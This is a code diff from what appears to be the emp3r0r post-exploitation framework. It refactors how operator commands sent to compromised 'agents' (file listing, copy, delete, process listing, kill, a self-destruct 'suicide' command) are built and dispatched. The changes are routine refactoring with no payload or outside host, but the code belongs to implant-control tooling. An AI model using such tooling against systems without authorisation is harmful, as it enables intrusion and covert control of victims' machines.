@@ -1,13 +1,10 @@
 package operator
 
 import (
-	"fmt"
 	"strconv"
-	"strings"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
-	c2context "github.com/jm33-m0/emp3r0r/core/internal/cc/context"
-	"github.com/jm33-m0/emp3r0r/core/internal/cc/modules"
+	"github.com/jm33-m0/emp3r0r/core/internal/cc/controllers"
 	"github.com/jm33-m0/emp3r0r/core/lib/cli"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"github.com/spf13/cobra"
@@ -18,12 +15,11 @@ func CmdLs(_ *cobra.Command, args []string) {
 	if len(args) != 0 {
 		dst = args[0]
 	}
-
-	CmdFSCmdDst("ls", dst)
+	executeCmd(controllers.BuildLsCommand(dst))
 }
 
 func CmdPwd(_ *cobra.Command, _ []string) {
-	executeCmd("pwd")
+	executeCmd(controllers.BuildPwdCommand())
 }
 
 func CmdCd(_ *cobra.Command, args []string) {
@@ -35,35 +31,34 @@ func CmdCd(_ *cobra.Command, args []string) {
 
 	dst := args[0]
 	activeAgent.CWD = dst
-	executeCmd(fmt.Sprintf("cd --dst %s", dst))
+	executeCmd(controllers.BuildCdCommand(dst))
 }
 
 func CmdCat(_ *cobra.Command, args []string) {
 	dst := args[0]
-	CmdFSCmdDst("cat", dst)
+	executeCmd(controllers.BuildCatCommand(dst))
 }
 
 func CmdCp(_ *cobra.Command, args []string) {
 	src := args[0]
 	dst := args[1]
-
-	CmdFSCmdSrcDst("cp", src, dst)
+	executeCmd(controllers.BuildCpCommand(src, dst))
 }
 
 func CmdRm(_ *cobra.Command, args []string) {
 	dst := args[0]
-	CmdFSCmdDst("rm", dst)
+	executeCmd(controllers.BuildRmCommand(dst))
 }
 
 func CmdMkdir(_ *cobra.Command, args []string) {
 	dst := args[0]
-	CmdFSCmdDst("mkdir", dst)
+	executeCmd(controllers.BuildMkdirCommand(dst))
 }
 
 func CmdMv(_ *cobra.Command, args []string) {
 	src := args[0]
 	dst := args[1]
-	CmdFSCmdSrcDst("mv", src, dst)
+	executeCmd(controllers.BuildMvCommand(src, dst))
 }
 
 func CmdPs(cmd *cobra.Command, args []string) {
@@ -72,29 +67,16 @@ func CmdPs(cmd *cobra.Command, args []string) {
 	name, _ := cmd.Flags().GetString("name")
 	cmdLine, _ := cmd.Flags().GetString("cmdline")
 
-	cmdArgs := "ps"
-	if pid != 0 {
-		cmdArgs = fmt.Sprintf("%s --pid %d", cmdArgs, pid)
-	}
-	if user != "" {
-		cmdArgs = fmt.Sprintf("%s --user %s", cmdArgs, user)
-	}
-	if name != "" {
-		cmdArgs = fmt.Sprintf("%s --name %s", cmdArgs, name)
-	}
-	if cmdLine != "" {
-		cmdArgs = fmt.Sprintf("%s --cmdline %s", cmdArgs, cmdLine)
-	}
 	logging.Warningf("OPSEC: ps recorded as process/thread enumeration")
-	executeCmd(cmdArgs)
+	executeCmd(controllers.BuildPsCommand(pid, user, name, cmdLine))
 }
 
 func CmdNetHelper(_ *cobra.Command, _ []string) {
-	executeCmd("net_helper")
+	executeCmd(controllers.BuildNetHelperCommand())
 }
 
 func CmdSuicide(_ *cobra.Command, _ []string) {
-	executeCmd("suicide")
+	executeCmd(controllers.BuildSuicideCommand())
 }
 
 func CmdKill(cmd *cobra.Command, args []string) {
@@ -103,16 +85,25 @@ func CmdKill(cmd *cobra.Command, args []string) {
 		return
 	}
 
-	// Validate that all arguments are valid PIDs
-	for _, pidStr := range args {
-		if pid, err := strconv.Atoi(pidStr); err != nil || pid <= 0 {
+	// Convert string PIDs to ints
+	pids := make([]int, len(args))
+	for i, pidStr := range args {
+		pid, err := strconv.Atoi(pidStr)
+		if err != nil || pid <= 0 {
 			logging.Errorf("kill: invalid PID '%s': must be a positive integer", pidStr)
 			return
 		}
+		pids[i] = pid
 	}
 
-	// Send kill command with space-separated PIDs as positional arguments
-	executeCmd(fmt.Sprintf("kill %s", strings.Join(args, " ")))
+	// Build command using controller
+	killCmd, err := controllers.BuildKillCommand(pids)
+	if err != nil {
+		logging.Errorf("kill: %v", err)
+		return
+	}
+
+	executeCmd(killCmd)
 }
 
 func CmdResetLayout(_ *cobra.Command, _ []string) {
@@ -124,25 +115,16 @@ func CmdResetLayout(_ *cobra.Command, _ []string) {
 	}
 }
 
-func CmdFSCmdDst(cmd, dst string) {
-	executeCmd(fmt.Sprintf("%s --dst '%s'", cmd, dst))
-}
-
-func CmdFSCmdSrcDst(cmd, src, dst string) {
-	executeCmd(fmt.Sprintf("%s --src '%s' --dst '%s'", cmd, src, dst))
-}
-
+// executeCmd is a thin wrapper that gets active agent and calls controller
 func executeCmd(cmd string) {
 	activeAgent := agents.MustGetActiveAgent()
 	if activeAgent == nil {
 		logging.Errorf("%s: no active target", cmd)
 		return
 	}
-	ctx := &c2context.C2Context{
-		Target:    activeAgent,
-		OpSession: OPERATOR_SESSION,
-		Flags:     make(map[string]string),
+
+	err := controllers.ExecuteAgentCommand(activeAgent, cmd, OPERATOR_SESSION)
+	if err != nil {
+		logging.Errorf("Failed to execute command: %v", err)
 	}
-	ctx.Flags["cmd_to_exec"] = cmd
-	modules.ModuleCmd(ctx)
 }
